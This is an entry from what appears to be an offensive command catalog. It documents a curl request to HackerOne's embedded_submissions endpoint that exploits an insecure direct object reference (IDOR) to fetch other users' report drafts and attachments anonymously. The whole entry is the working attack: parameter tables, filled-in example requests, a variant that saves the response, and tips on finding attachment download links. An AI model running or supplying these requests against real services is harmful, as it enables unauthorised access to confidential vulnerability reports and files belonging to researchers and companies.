---
id: cmd-001
data: >-
  curl -X POST 'https://hackerone.com/:uuid/embedded_submissions' -H
  'Content-Type: multipart/form-data' -F 'report_draft[id]=<draft_id>' -F
  'team_id=<team_id>'
tags:
  - web-exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.512Z'
verified: false
validated: true
submitted: true
---
# curl-post-embedded-submission-no-tracer

## Command

```bash
curl -X POST 'https://hackerone.com/:uuid/embedded_submissions' \
  -H 'Content-Type: multipart/form-data' \
  -F 'report_draft[id]=<draft_id>' \
  -F 'team_id=<team_id>'
```

## Description

This curl command sends a POST request to HackerOne's embedded submissions endpoint without the 'tracer' parameter, exploiting IDOR to fetch unauthorized report drafts and attachments as an anonymous user. Replace :uuid with the program's UUID, <draft_id> with the target draft ID, and <team_id> with the program's team ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://hackerone.com/:uuid/embedded_submissions` | Target endpoint URL | Yes |
| `-H 'Content-Type: multipart/form-data'` | Sets form-data content type for submissions | Yes |
| `-F 'report_draft[id]=<draft_id>'` | Specifies the draft ID to fetch | Yes |
| `-F 'team_id=<team_id>'` | Specifies the program team ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/0a1e1f11-257e-4b46-b949-c7151212ffbb/embedded_submissions' \
  -H 'Content-Type: multipart/form-data' \
  -F 'report_draft[id]=12345' \
  -F 'team_id=456'
```

### Advanced Usage

Add verbose output and save response:

```bash
curl -v -X POST 'https://hackerone.com/:uuid/embedded_submissions' \
  -H 'Content-Type: multipart/form-data' \
  -F 'report_draft[id]=12345' \
  -F 'team_id=456' \
  -o response.json
```

## Expected Output

JSON or HTML response containing draft details and attachment metadata/URLs if successful. Look for fields like 'attachments' array with download links. Errors may indicate invalid ID or protections.

## Related

- [[Related Procedure: Exploit-IDOR-for-Attachment-Theft]]
